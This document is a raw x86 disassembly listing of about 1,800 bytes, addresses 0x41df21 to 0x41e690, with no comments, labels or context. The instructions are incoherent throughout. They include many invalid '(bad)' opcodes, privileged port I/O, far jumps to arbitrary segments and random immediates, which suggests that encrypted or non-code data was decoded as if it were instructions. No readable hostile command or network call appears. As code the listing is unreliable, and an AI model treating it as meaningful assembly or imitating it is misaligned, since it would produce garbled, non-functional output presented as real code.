  41df21:	lods   al,BYTE PTR ds:[esi]
  41df22:	dec    ecx
  41df23:	addr16 imul edx,ebx,0x31
  41df27:	hlt    
  41df28:	jecxz  0x41dfa2
  41df2a:	sbb    DWORD PTR [ebx-0x2e31a9e5],ebx
  41df30:	in     al,0x3
  41df32:	and    edx,DWORD PTR [eax]
  41df34:	js     0x41df8a
  41df36:	mov    ah,0x10
  41df38:	cmp    al,0x5
  41df3a:	jnp    0x41dfa2
  41df3c:	fs push edx
  41df3e:	es push 0xffffff9a
  41df41:	es nop
  41df43:	aad    0xd3
  41df45:	mov    ah,0xaa
  41df47:	ins    BYTE PTR es:[edi],dx
  41df48:	jp     0x41df15
  41df4a:	in     al,dx
  41df4b:	outs   dx,DWORD PTR ds:[esi]
  41df4c:	sbb    ch,BYTE PTR [eax]
  41df4e:	sub    bl,BYTE PTR [edx-0x66]
  41df51:	pop    es
  41df52:	push   ebx
  41df53:	pop    ecx
  41df54:	mov    dh,BYTE PTR [edi]
  41df56:	jae    0x41deec
  41df58:	jle    0x41dfcc
  41df5a:	es xor eax,0xd7418b7
  41df60:	sti    
  41df61:	pop    ss
  41df62:	pushf  
  41df63:	pop    ebx
  41df64:	jl     0x41df0f
  41df66:	dec    ebp
  41df67:	jg     0x41df4a
  41df69:	xor    cl,0x83
  41df6c:	dec    bx
  41df6e:	shr    BYTE PTR [esi-0x270607cc],1
  41df74:	es scas eax,DWORD PTR es:[edi]
  41df76:	xchg   ebp,eax
  41df77:	pop    ebp
  41df78:	ss lock sbb eax,0xe1970487
  41df7f:	push   ebx
  41df80:	jo     0x41df96
  41df82:	push   cs
  41df83:	stos   DWORD PTR es:[edi],eax
  41df84:	ror    DWORD PTR [edi+0x6e],1
  41df87:	mov    WORD PTR [ebp-0x67],gs
  41df8a:	test   al,0xec
  41df8c:	(bad)  [edi]
  41df8e:	adc    dh,dh
  41df90:	addr16 pop ecx
  41df92:	and    esp,ebx
  41df94:	cmp    ebx,edi
  41df96:	in     eax,dx
  41df97:	jl     0x41df40
  41df99:	test   BYTE PTR [edx],0x3f
  41df9c:	jp     0x41df2e
  41df9e:	imul   ebx,DWORD PTR [edx+0x14366491],0x8d63cc35
  41dfa8:	inc    ebp
  41dfa9:	pop    ecx
  41dfaa:	sub    al,BYTE PTR [edx]
  41dfac:	sub    cl,BYTE PTR [ebx]
  41dfae:	sbb    DWORD PTR [ecx],ebx
  41dfb0:	mov    es,esp
  41dfb2:	nop
  41dfb3:	inc    ebp
  41dfb4:	outs   dx,BYTE PTR ds:[esi]
  41dfb5:	dec    eax
  41dfb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfb7:	xchg   esp,eax
  41dfb8:	enter  0x17ee,0x2b
  41dfbc:	out    0x19,eax
  41dfbe:	repnz pop ebp
  41dfc0:	(bad)  
  41dfc1:	xor    BYTE PTR [edi+0x22668d6e],dl
  41dfc7:	test   BYTE PTR [ecx+0x78e7dc46],0xb3
  41dfce:	adc    DWORD PTR [di-0x313f],eax
  41dfd3:	lods   eax,DWORD PTR ds:[esi]
  41dfd4:	outs   dx,BYTE PTR ds:[esi]
  41dfd5:	jp     0x41dfb7
  41dfd7:	xor    eax,0x7339ec27
  41dfdc:	and    eax,DWORD PTR [ebx-0x6]
  41dfdf:	out    dx,eax
  41dfe0:	leave  
  41dfe1:	shr    DWORD PTR [esp+edx*2-0x64],0xd4
  41dfe6:	out    0xb7,al
  41dfe8:	jae    0x41dfa8
  41dfea:	sbb    BYTE PTR [edx],0x6d
  41dfed:	mov    dh,0x1b
  41dfef:	cmp    esi,DWORD PTR [esp+edx*2+0x4]
  41dff3:	jp     0x41e074
  41dff5:	pop    ecx
  41dff6:	pop    eax
  41dff7:	sbb    BYTE PTR [esi+0x43],dl
  41dffa:	mov    ebp,0xbc0148ae
  41dfff:	push   edi
  41e000:	outs   dx,DWORD PTR ds:[esi]
  41e001:	lea    edx,[edx]
  41e003:	mov    ah,0x72
  41e005:	addr16 cmc 
  41e007:	xchg   edx,eax
  41e008:	test   eax,0x5e936a12
  41e00d:	outs   dx,BYTE PTR ds:[esi]
  41e00e:	outs   dx,DWORD PTR ds:[esi]
  41e00f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e010:	mov    ebp,0x4a062df7
  41e015:	pop    edi
  41e016:	and    ebp,DWORD PTR [edi-0x37f47b96]
  41e01c:	cs in  al,dx
  41e01e:	loope  0x41e071
  41e020:	cmp    eax,0x679231de
  41e025:	sbb    al,bh
  41e027:	call   0x27e910e9
  41e02c:	xchg   ebp,eax
  41e02d:	or     DWORD PTR [eax],esp
  41e02f:	dec    ecx
  41e030:	shl    BYTE PTR gs:[ecx+0x672313a4],cl
  41e037:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e038:	and    DWORD PTR [esp+eiz*2-0x159d95a7],esi
  41e03f:	dec    eax
  41e040:	in     eax,0x80
  41e042:	imul   ebp,DWORD PTR [eax-0x63],0x6
  41e046:	add    ebx,DWORD PTR [ecx+0x60d6e2cb]
  41e04c:	call   0x946f:0x4f5cf76b
  41e053:	fadd   QWORD PTR [eax]
  41e055:	ret    0x276b
  41e058:	stos   DWORD PTR es:[edi],eax
  41e059:	aas    
  41e05a:	outs   dx,BYTE PTR ds:[esi]
  41e05b:	xchg   edx,eax
  41e05c:	mov    BYTE PTR [esi-0x6c],bh
  41e05f:	jp     0x41e0b8
  41e061:	push   ecx
  41e062:	ins    DWORD PTR es:[edi],dx
  41e063:	in     eax,dx
  41e064:	sbb    eax,0xeffdb701
  41e069:	cli    
  41e06a:	inc    ecx
  41e06b:	xchg   DWORD PTR [esp+edx*2+0x6ff2ebb5],ebx
  41e072:	push   esp
  41e073:	repz push es
  41e075:	fdivr  QWORD PTR [ebp-0x5c3e4cf8]
  41e07b:	loop   0x41e039
  41e07d:	jecxz  0x41e062
  41e07f:	pusha  
  41e080:	ins    DWORD PTR es:[edi],dx
  41e081:	xchg   esi,eax
  41e082:	imul   ebx,DWORD PTR [esi+ecx*2],0x35f74a64
  41e089:	lea    eax,[esi+0x7b]
  41e08c:	mov    cl,0xb2
  41e08e:	pop    edx
  41e08f:	scas   al,BYTE PTR es:[edi]
  41e090:	mov    ah,0xaa
  41e092:	dec    eax
  41e093:	adc    BYTE PTR [esi-0x7236f41e],dh
  41e099:	jae    0x41e0f3
  41e09b:	jbe    0x41e0e4
  41e09d:	mov    ah,0x3
  41e09f:	push   ds
  41e0a0:	mov    ebx,0xb6ba942a
  41e0a5:	adc    eax,0x469dc8b9
  41e0aa:	retf   
  41e0ab:	mov    edi,0xb4c9c865
  41e0b0:	adc    ebx,ebp
  41e0b2:	adc    eax,0x57f7ead7
  41e0b7:	adc    al,0x0
  41e0b9:	mov    ah,BYTE PTR [eax+ebp*2]
  41e0bc:	mov    edi,0x53534d52
  41e0c1:	jecxz  0x41e0ee
  41e0c3:	mov    eax,0xe338133a
  41e0c8:	popa   
  41e0c9:	stos   DWORD PTR es:[edi],eax
  41e0ca:	cmp    al,0xd2
  41e0cc:	mov    ds:0x3957aab0,al
  41e0d1:	(bad)  
  41e0d3:	adc    BYTE PTR [edi+0x10809774],bl
  41e0d9:	sub    DWORD PTR [ebx+0xa3e479e],edx
  41e0df:	dec    ebp
  41e0e0:	push   cs
  41e0e1:	pop    ecx
  41e0e2:	xor    BYTE PTR [ebp-0x4cf20e24],0xe1
  41e0e9:	xor    ah,BYTE PTR [ebp+0x30]
  41e0ec:	xor    edi,DWORD PTR [edx]
  41e0ee:	enter  0xa488,0x67
  41e0f2:	xor    eax,0xd81d53e9
  41e0f7:	push   cs
  41e0f8:	imul   edi,ebp,0xffffffe6
  41e0fb:	sahf   
  41e0fc:	dec    ebx
  41e0fd:	into   
  41e0fe:	int    0x7d
  41e100:	test   BYTE PTR [esi-0x58],ch
  41e103:	dec    eax
  41e104:	and    BYTE PTR [ecx],0x89
  41e107:	loop   0x41e174
  41e109:	mov    ds:0x7ea7a687,eax
  41e10e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e10f:	loopne 0x41e13f
  41e111:	jnp    0x41e108
  41e113:	adc    cl,bh
  41e115:	mov    ebx,0x29312643
  41e11a:	fst    DWORD PTR [ecx-0x15d59a0d]
  41e120:	lock es mov eax,0x4b43950a
  41e127:	in     eax,0x97
  41e129:	jg     0x41e101
  41e12b:	icebp  
  41e12c:	jbe    0x41e168
  41e12e:	dec    ebx
  41e12f:	aad    0x74
  41e131:	fwait
  41e132:	and    esp,ebx
  41e134:	(bad)  
  41e135:	addr16 dec edx
  41e137:	test   al,0xd4
  41e139:	inc    ebp
  41e13a:	cmp    BYTE PTR [ebx],dh
  41e13c:	aam    0x1d
  41e13e:	pop    esi
  41e13f:	lock test eax,0x4d66628f
  41e145:	and    esp,edx
  41e147:	adc    eax,0x72276b76
  41e14c:	mov    edi,0x2b14fd8b
  41e151:	jne    0x41e149
  41e153:	hlt    
  41e154:	ja     0x41e182
  41e156:	in     eax,dx
  41e157:	inc    ebp
  41e158:	int3   
  41e159:	into   
  41e15a:	repnz cmp BYTE PTR [ebx-0x55],al
  41e15e:	rol    BYTE PTR [edi+0x66b66cf9],0x7e
  41e165:	inc    edx
  41e166:	js     0x41e179
  41e168:	mov    edx,0x2db241f2
  41e16d:	ja     0x41e0fe
  41e16f:	dec    eax
  41e170:	ret    
  41e171:	leave  
  41e172:	xor    BYTE PTR [edi-0x5c],bh
  41e175:	daa    
  41e176:	dec    esi
  41e177:	pop    esp
  41e178:	mov    bl,0x7
  41e17a:	xor    ecx,edi
  41e17c:	jmp    0x8427:0x111ccff8
  41e183:	cmp    edi,edi
  41e185:	jno    0x41e1c4
  41e187:	sub    bh,dl
  41e189:	jnp    0x41e142
  41e18b:	jbe    0x41e1e7
  41e18d:	push   0xfffffff0
  41e18f:	sbb    DWORD PTR [eax-0x66],ebp
  41e192:	aad    0x54
  41e194:	jmp    0x41e145
  41e196:	mov    BYTE PTR [edx-0x20],0x6a
  41e19a:	mov    dh,0x50
  41e19c:	or     al,0x8
  41e19e:	sbb    ebp,DWORD PTR [ebx+0x75037cc8]
  41e1a4:	cdq    
  41e1a5:	push   es
  41e1a6:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41e1a8:	imul   eax,DWORD PTR [edi],0xffffff81
  41e1ab:	sti    
  41e1ac:	mov    al,BYTE PTR [edx-0x63]
  41e1af:	or     eax,0x73bd1d96
  41e1b4:	fdiv   QWORD PTR [esi-0x6c]
  41e1b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1b8:	push   edi
  41e1b9:	xchg   esi,eax
  41e1ba:	pop    edx
  41e1bb:	out    0xc2,al
  41e1bd:	sbb    DWORD PTR [esi-0x417ef5e],edi
  41e1c3:	(bad)  
  41e1c4:	in     eax,0x11
  41e1c6:	mov    ds:0xea84dc32,al
  41e1cb:	imul   esp,ebp,0x75
  41e1ce:	push   0xc4c99cfe
  41e1d3:	sbb    al,0x72
  41e1d5:	cmp    eax,0x9b6bbf32
  41e1da:	ret    
  41e1db:	or     dl,BYTE PTR [esi+0x2d4f181a]
  41e1e1:	test   BYTE PTR [ebx+esi*1+0x71],bl
  41e1e5:	loopne 0x41e203
  41e1e7:	mov    eax,0xea6a4ac
  41e1ec:	lods   al,BYTE PTR ds:[esi]
  41e1ed:	hlt    
  41e1ee:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41e1f0:	and    al,BYTE PTR [ebx-0x4de3277e]
  41e1f6:	clc    
  41e1f7:	jo     0x41e1ff
  41e1f9:	and    dl,BYTE PTR [edx]
  41e1fb:	and    DWORD PTR [edx],ebx
  41e1fd:	int    0x71
  41e1ff:	shl    dh,0x22
  41e202:	push   eax
  41e203:	jmp    0xa1d4:0x3ebea04
  41e20a:	repz mov dl,0x45
  41e20d:	jmp    eax
  41e20f:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e211:	mov    dl,0xda
  41e213:	mov    esi,0x95b0b29c
  41e218:	(bad)  
  41e219:	call   0x34ad40a1
  41e21e:	aam    0xc
  41e220:	sub    DWORD PTR [edx],eax
  41e222:	dec    ebp
  41e223:	jbe    0x41e281
  41e225:	cwde   
  41e226:	dec    ecx
  41e227:	jp     0x41e24c
  41e229:	add    eax,0xb4a93ece
  41e22e:	add    al,0x4d
  41e230:	fiadd  DWORD PTR [edi+0x31974667]
  41e236:	call   0x7eb9a46d
  41e23b:	sbb    eax,0x719ae0e4
  41e240:	sbb    edi,eax
  41e242:	dec    ecx
  41e243:	outs   dx,BYTE PTR ds:[esi]
  41e244:	mov    ebx,0x83f59e03
  41e249:	mov    bl,0xd9
  41e24b:	mov    al,ds:0x184a6807
  41e250:	(bad)  
  41e251:	dec    ebx
  41e252:	pop    ebx
  41e253:	jle    0x41e23e
  41e255:	retf   0x4fc9
  41e258:	jecxz  0x41e28e
  41e25a:	add    DWORD PTR [edi+0x2d],0x5ed299b0
  41e261:	sbb    eax,0xf8a910a
  41e266:	pop    ecx
  41e267:	es mov bh,0x71
  41e26a:	sbb    DWORD PTR [eax-0x67f11b1b],edi
  41e270:	dec    esp
  41e271:	mov    ds:0xbcb2e9,eax
  41e276:	ins    BYTE PTR es:[edi],dx
  41e277:	in     al,0xa5
  41e279:	adc    cl,cl
  41e27b:	jns    0x41e274
  41e27d:	into   
  41e27e:	xchg   BYTE PTR [ebx+0x664775f6],ch
  41e284:	fldcw  WORD PTR [edx+edx*2-0x57]
  41e288:	int    0xb9
  41e28a:	nop
  41e28b:	shl    BYTE PTR [edi+0x3e],0xa4
  41e28f:	imul   ebx,DWORD PTR [edx+0x2f],0xd387aaa4
  41e296:	in     al,0x8e
  41e298:	lods   eax,DWORD PTR ds:[esi]
  41e299:	dec    DWORD PTR [ebx]
  41e29b:	gs icebp 
  41e29d:	cmc    
  41e29e:	xor    al,0x3e
  41e2a0:	std    
  41e2a1:	add    esi,esp
  41e2a3:	jnp    0x41e2c1
  41e2a5:	jg     0x41e28c
  41e2a7:	lods   al,BYTE PTR ds:[esi]
  41e2a8:	(bad)  
  41e2a9:	push   ds
  41e2aa:	mov    WORD PTR [esp+eax*1+0x72a25365],cs
  41e2b1:	adc    eax,edi
  41e2b3:	dec    edi
  41e2b4:	je     0x41e312
  41e2b6:	test   al,0x4f
  41e2b8:	sar    BYTE PTR [esi+0x22],0xfe
  41e2bc:	mov    cl,0x46
  41e2be:	add    edi,DWORD PTR [eax]
  41e2c0:	and    eax,0xe65f330c
  41e2c5:	sahf   
  41e2c6:	ins    DWORD PTR es:[edi],dx
  41e2c7:	in     eax,0x56
  41e2c9:	not    BYTE PTR [ebx]
  41e2cb:	fs cmp bh,ch
  41e2ce:	fdivr  QWORD PTR [edi+0x5c]
  41e2d1:	cs js  0x41e2a8
  41e2d4:	pop    eax
  41e2d5:	xchg   edi,eax
  41e2d6:	popf   
  41e2d7:	jl     0x41e26e
  41e2d9:	cli    
  41e2da:	jecxz  0x41e2b0
  41e2dc:	adc    eax,ebp
  41e2de:	sbb    eax,0xe6148501
  41e2e3:	mov    edi,0x2e36b6f6
  41e2e8:	ins    DWORD PTR es:[edi],dx
  41e2e9:	or     DWORD PTR [esi-0x3a],esi
  41e2ec:	dec    edi
  41e2ed:	jae    0x41e295
  41e2ef:	lods   al,BYTE PTR ds:[esi]
  41e2f0:	and    edi,DWORD PTR [ebp+edx*4+0x405e5dfc]
  41e2f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2f8:	push   esi
  41e2f9:	mov    al,ds:0xbca5b658
  41e2fe:	(bad)
  41e301:	pop    ss
  41e302:	rcl    BYTE PTR [edx],cl
  41e304:	mov    esi,0x29528fcf
  41e309:	mov    eax,0x2bb36694
  41e30e:	aam    0xcf
  41e310:	and    al,0xf2
  41e312:	scas   eax,DWORD PTR es:[edi]
  41e313:	ret    0x3f97
  41e316:	push   es
  41e317:	mov    ecx,0x73b94d73
  41e31c:	add    eax,0xae92b32e
  41e321:	xor    DWORD PTR [edx],eax
  41e323:	push   ds
  41e324:	pop    ecx
  41e325:	dec    ecx
  41e326:	cld    
  41e327:	adc    al,BYTE PTR [ecx+ebp*2+0x368671c3]
  41e32e:	pop    eax
  41e32f:	inc    ebp
  41e330:	repnz (bad) 
  41e332:	mov    esi,ebx
  41e334:	sbb    esp,ecx
  41e336:	xchg   ebx,eax
  41e337:	out    0x73,al
  41e339:	loope  0x41e341
  41e33b:	inc    esi
  41e33c:	add    ch,bh
  41e33e:	jb     0x41e2c5
  41e340:	mov    cl,0xe9
  41e342:	test   eax,0x345101a3
  41e347:	xor    al,bl
  41e349:	lods   eax,DWORD PTR ds:[esi]
  41e34a:	lods   al,BYTE PTR ds:[esi]
  41e34b:	xor    al,0x2b
  41e34d:	in     al,dx
  41e34e:	push   0xfffffff8
  41e350:	ret    0x5c75
  41e353:	xor    edi,DWORD PTR [eax+eax*1]
  41e356:	xor    DWORD PTR [ebx+0x37581520],esi
  41e35c:	ins    DWORD PTR es:[edi],dx
  41e35d:	in     al,0x95
  41e35f:	gs cld 
  41e361:	push   edx
  41e362:	cmc    
  41e363:	and    DWORD PTR gs:[esi+0x56],edx
  41e367:	push   edx
  41e368:	push   ds
  41e369:	aaa    
  41e36a:	mov    dl,0x9c
  41e36c:	add    BYTE PTR [edi],cl
  41e36e:	out    dx,al
  41e36f:	loope  0x41e381
  41e371:	mov    al,ds:0x45ee2cdf
  41e376:	je     0x41e3b1
  41e378:	fwait
  41e379:	and    al,0x90
  41e37b:	scas   eax,DWORD PTR es:[edi]
  41e37c:	inc    esi
  41e37d:	ficom  DWORD PTR [ecx]
  41e37f:	pop    eax
  41e380:	inc    DWORD PTR [ebx+ecx*1]
  41e383:	iret   
  41e384:	sahf   
  41e385:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e386:	sub    ecx,esp
  41e388:	push   edx
  41e389:	gs mov bh,0x9
  41e38c:	mov    bh,0x73
  41e38e:	cmc    
  41e38f:	out    dx,al
  41e390:	xor    DWORD PTR [esi],edx
  41e392:	inc    eax
  41e393:	sbb    ebp,edi
  41e395:	sahf   
  41e396:	add    DWORD PTR fs:[edx],edx
  41e399:	xchg   esi,eax
  41e39a:	mov    DWORD PTR [esi+edi*2+0x64],eax
  41e39e:	fs jmp 0x40aadf39
  41e3a4:	mov    ds:0x40aa1a5d,eax
  41e3a9:	test   eax,0x55fd8184
  41e3ae:	les    esp,FWORD PTR [edi-0x7885c801]
  41e3b4:	mov    ebp,0x967fe58
  41e3b9:	mov    BYTE PTR [edx+eiz*2],dh
  41e3bc:	mov    bh,0x6c
  41e3be:	hlt    
  41e3bf:	push   edx
  41e3c0:	xchg   edi,eax
  41e3c1:	loope  0x41e3b7
  41e3c3:	ins    BYTE PTR es:[edi],dx
  41e3c4:	xlat   BYTE PTR ds:[ebx]
  41e3c5:	pushf  
  41e3c6:	fsubr  DWORD PTR [ebx]
  41e3c8:	scas   al,BYTE PTR es:[edi]
  41e3c9:	stc    
  41e3ca:	test   al,0xdc
  41e3cc:	xchg   edi,eax
  41e3cd:	test   eax,0x1ded681f
  41e3d2:	out    0xc6,al
  41e3d4:	pop    ebx
  41e3d5:	ja     0x41e3b5
  41e3d7:	sbb    al,0xd2
  41e3d9:	push   0xffffffe0
  41e3db:	clc    
  41e3dc:	stos   BYTE PTR es:[edi],al
  41e3dd:	(bad)  
  41e3de:	jmp    0x54c1874e
  41e3e3:	push   ebp
  41e3e4:	sub    ah,BYTE PTR [eax+0x1768b7d]
  41e3ea:	cmp    DWORD PTR [eax+0x6610e71d],ebp
  41e3f0:	jecxz  0x41e428
  41e3f2:	lahf   
  41e3f3:	and    ah,BYTE PTR [eax+0x33673141]
  41e3f9:	stos   BYTE PTR es:[edi],al
  41e3fa:	popf   
  41e3fb:	into   
  41e3fc:	nop
  41e3fd:	sahf   
  41e3fe:	adc    DWORD PTR gs:[esi],eax
  41e401:	(bad)  
  41e402:	ja     0x41e3d9
  41e404:	jne    0x41e455
  41e406:	gs pop ecx
  41e408:	jmp    0x8d968c94
  41e40d:	mov    ecx,0x7ef22943
  41e412:	sbb    esp,DWORD PTR [ebx+0x3]
  41e415:	xor    dh,BYTE PTR [edi+ecx*8-0x42]
  41e419:	or     BYTE PTR [eax],0x72
  41e41c:	sbb    DWORD PTR [esp+edi*4+0x75bef5f7],ebp
  41e423:	jne    0x41e425
  41e425:	and    al,0xdf
  41e427:	iret   
  41e428:	ss inc eax
  41e42a:	xor    eax,0xb0644a87
  41e42f:	test   eax,0x705881c6
  41e434:	fisub  WORD PTR [edi]
  41e436:	es out 0xa3,al
  41e439:	jbe    0x41e41d
  41e43b:	pop    es
  41e43c:	jne    0x41e447
  41e43e:	mov    edi,0xd8d05928
  41e443:	into   
  41e444:	ds mov ebx,0x8a320056
  41e44a:	dec    edi
  41e44b:	stos   BYTE PTR es:[edi],al
  41e44c:	addr16 mov al,ds:0xb530
  41e450:	mov    cl,0x51
  41e452:	outs   dx,BYTE PTR ds:[esi]
  41e453:	into   
  41e454:	in     al,dx
  41e455:	add    DWORD PTR [ebp-0x724cb2fa],edx
  41e45b:	sbb    BYTE PTR [ecx-0x2d9e562],al
  41e461:	mov    BYTE PTR [ebx],dl
  41e463:	std    
  41e464:	mov    DWORD PTR [esi-0x70ce1ffd],ecx
  41e46a:	jno    0x41e3f3
  41e46c:	dec    esi
  41e46d:	rol    BYTE PTR [ebx-0x1c79a584],cl
  41e473:	xlat   BYTE PTR ds:[ebx]
  41e474:	xchg   ecx,eax
  41e475:	jbe    0x41e41e
  41e477:	pushf  
  41e478:	idiv   esp
  41e47a:	scas   al,BYTE PTR es:[edi]
  41e47b:	into   
  41e47c:	pop    ecx
  41e47d:	ret    
  41e47e:	sbb    ch,bl
  41e480:	mov    ds:0x4f805b8a,eax
  41e485:	pop    ebx
  41e486:	adc    al,0xce
  41e488:	pusha  
  41e489:	inc    ecx
  41e48a:	dec    esi
  41e48b:	adc    DWORD PTR [eax-0x7a339a9f],ebx
  41e491:	mov    al,ds:0x95b98486
  41e496:	shl    BYTE PTR [esi],cl
  41e498:	test   esp,eax
  41e49a:	repnz fwait
  41e49c:	lods   eax,DWORD PTR ds:[esi]
  41e49d:	mov    WORD PTR [eax],?
  41e49f:	mov    eax,0xdd65d14e
  41e4a4:	stos   BYTE PTR es:[edi],al
  41e4a5:	ss jle 0x41e45e
  41e4a8:	pushf  
  41e4a9:	div    DWORD PTR [esi]
  41e4ab:	cmp    al,0x9c
  41e4ad:	or     al,0x8e
  41e4af:	repz std 
  41e4b1:	in     al,dx
  41e4b2:	jl     0x8beb1492
  41e4b8:	jnp    0x41e495
  41e4ba:	or     eax,0x5b4b2d42
  41e4bf:	test   eax,0xa60627c6
  41e4c4:	idiv   ah
  41e4c6:	add    al,0x2c
  41e4c8:	not    edi
  41e4ca:	hlt    
  41e4cb:	jo     0x41e49c
  41e4cd:	mov    ah,0xe6
  41e4cf:	clc    
  41e4d0:	cmp    eax,DWORD PTR [esi+0x4abe44e4]
  41e4d6:	jae    0x41e4eb
  41e4d8:	xchg   edi,eax
  41e4d9:	std    
  41e4da:	cmp    DWORD PTR [ebx-0x719ec544],ecx
  41e4e0:	fadd   DWORD PTR [eax+0x2a]
  41e4e3:	mov    cl,0xa3
  41e4e5:	xchg   esi,eax
  41e4e6:	mov    ecx,0xa9899a3a
  41e4eb:	jne    0x41e538
  41e4ed:	mov    cs,WORD PTR [ecx+0x4f]
  41e4f0:	push   esp
  41e4f1:	ins    BYTE PTR es:[edi],dx
  41e4f2:	mov    edi,0x1b6b21f5
  41e4f7:	aaa    
  41e4f8:	dec    ecx
  41e4f9:	test   al,0x54
  41e4fb:	xchg   BYTE PTR es:[ecx-0x5e],dl
  41e4ff:	xchg   ebx,eax
  41e500:	mov    ?,WORD PTR [edx+eax*2+0x3086e7ef]
  41e507:	arpl   WORD PTR [esp+edi*1-0x1c],di
  41e50b:	sbb    BYTE PTR [esi],cl
  41e50d:	scas   eax,DWORD PTR es:[edi]
  41e50e:	leave  
  41e50f:	xchg   esp,eax
  41e510:	sub    ah,cl
  41e512:	push   eax
  41e513:	add    al,0x5d
  41e515:	jle    0x41e4fb
  41e517:	fs xor eax,0x9739db12
  41e51d:	ins    DWORD PTR es:[edi],dx
  41e51e:	sbb    BYTE PTR [ebp+0x3ec9094a],al
  41e524:	icebp  
  41e525:	fs cmc 
  41e527:	inc    esp
  41e528:	lods   al,BYTE PTR ds:[esi]
  41e529:	and    eax,DWORD PTR [ebx+0x54762393]
  41e52f:	hlt    
  41e530:	inc    ecx
  41e531:	retf   
  41e532:	(bad)  
  41e533:	cld    
  41e534:	inc    eax
  41e535:	xor    al,0x4d
  41e537:	inc    ebp
  41e538:	or     DWORD PTR [esi],ebx
  41e53a:	or     BYTE PTR [ebx+0x46e2801a],0xcd
  41e541:	sbb    eax,0x3796e749
  41e546:	int3   
  41e547:	xlat   BYTE PTR ds:[ebx]
  41e548:	es fwait
  41e54a:	push   ecx
  41e54b:	mov    edx,DWORD PTR [edx-0x38]
  41e54e:	inc    ebp
  41e54f:	clc    
  41e550:	add    eax,0xd2f87d8a
  41e555:	arpl   WORD PTR [edx+0xc],si
  41e558:	mov    al,0xb1
  41e55a:	(bad)
  41e55d:	sub    BYTE PTR [ecx],ah
  41e55f:	push   esi
  41e560:	repnz inc ecx
  41e562:	mov    esp,0xd1948c5c
  41e567:	or     ah,BYTE PTR [esp+edx*1]
  41e56a:	jne    0x41e55a
  41e56c:	aas    
  41e56d:	std    
  41e56e:	inc    edx
  41e56f:	sti    
  41e570:	lds    ebp,FWORD PTR [ecx-0x5a6386e8]
  41e576:	pop    eax
  41e577:	dec    edx
  41e578:	arpl   bp,bx
  41e57a:	fisub  DWORD PTR [ecx]
  41e57c:	push   si
  41e57e:	xor    eax,DWORD PTR [ebx+0x2]
  41e581:	ficom  DWORD PTR [esi]
  41e583:	cs call 0xf944a540
  41e589:	add    al,0xe6
  41e58b:	sub    DWORD PTR [edi+0x16],ebx
  41e58e:	(bad)  
  41e58f:	mov    ebp,0xc38f1252
  41e594:	stos   DWORD PTR es:[edi],eax
  41e595:	fsub   DWORD PTR [ebx-0x515be5ea]
  41e59b:	adc    bl,cl
  41e59d:	jecxz  0x41e5fc
  41e59f:	test   BYTE PTR [edx],ch
  41e5a1:	lock (bad) 
  41e5a3:	mov    edi,0x2f18a6e6
  41e5a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5a9:	pop    bp
  41e5ab:	ja     0x41e5a9
  41e5ad:	add    esp,DWORD PTR [esi+ebp*1+0x469acb]
  41e5b4:	scas   al,BYTE PTR es:[edi]
  41e5b5:	cmp    bl,BYTE PTR [ebx+0x5ca4e1d6]
  41e5bb:	loop   0x41e605
  41e5bd:	and    ecx,edi
  41e5bf:	mov    dl,0xad
  41e5c1:	mov    eax,0xf2b44cea
  41e5c6:	add    ebp,DWORD PTR [ebx-0x3e]
  41e5c9:	inc    ebx
  41e5ca:	leave  
  41e5cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5cc:	arpl   WORD PTR ds:0x62fd9c96,bx
  41e5d2:	lea    ebp,[eax+edi*1]
  41e5d5:	in     al,0xbd
  41e5d7:	cli    
  41e5d8:	pop    DWORD PTR [ecx+0x43636a8e]
  41e5de:	sahf   
  41e5df:	mov    ebp,0xf73a7122
  41e5e4:	jmp    0xc4ed:0xe867be31
  41e5eb:	add    al,0xd6
  41e5ed:	hlt    
  41e5ee:	rcr    DWORD PTR [edi+0x46],1
  41e5f1:	loop   0x41e581
  41e5f3:	outs   dx,BYTE PTR ds:[esi]
  41e5f4:	adc    ebp,DWORD PTR [eax-0x1f9c51a0]
  41e5fa:	test   al,0x42
  41e5fc:	or     DWORD PTR [edi+0x5a],edx
  41e5ff:	test   BYTE PTR [edx-0x32f18d12],ah
  41e605:	mov    esp,0x100bef1a
  41e60a:	or     eax,0x433518bd
  41e60f:	xchg   BYTE PTR [edi-0x25],dh
  41e612:	(bad)
  41e616:	daa    
  41e617:	sub    BYTE PTR [edx+0x64d2c200],cl
  41e61d:	xchg   esi,eax
  41e61e:	pop    esi
  41e61f:	sub    DWORD PTR [edx+eiz*8-0x4ada41c9],ebx
  41e626:	pop    es
  41e627:	aad    0x8
  41e629:	mov    al,ds:0x6484b057
  41e62e:	fisttp DWORD PTR [ecx+ecx*2+0x1308aa6c]
  41e635:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e636:	mov    ebp,0xf03f3e1d
  41e63b:	or     ebx,DWORD PTR [esi-0x12]
  41e63e:	repz jbe 0x41e5c4
  41e641:	push   ebp
  41e642:	jl     0x41e6b4
  41e644:	dec    edx
  41e645:	and    al,0x71
  41e647:	cmp    al,0xa
  41e649:	jo     0x41e5f6
  41e64b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e64c:	test   BYTE PTR [ecx+eiz*1+0x78],0x19
  41e651:	mov    al,0x23
  41e653:	mov    ds:0xa24704c8,al
  41e658:	or     BYTE PTR [edi+0xedf1c],ch
  41e65e:	call   0x336f:0x9daf51c5
  41e665:	mov    cl,0xb0
  41e667:	ret    0xcb20
  41e66a:	lock cmp eax,0x733a587d
  41e670:	test   BYTE PTR [esi+0x31],0xbd
  41e674:	mov    ds:0x7dab2a33,al
  41e679:	jl     0x41e6ed
  41e67b:	mov    WORD PTR [esi],es
  41e67d:	push   0xffffffe0
  41e67f:	and    eax,0x4f756cd7
  41e684:	shr    BYTE PTR [ebx+0x6e],cl
  41e687:	inc    ebx
  41e688:	sbb    bh,cl
  41e68a:	mov    ebx,0x37c39d20
  41e68f:	das    
  41e690:	in     al,0x7f
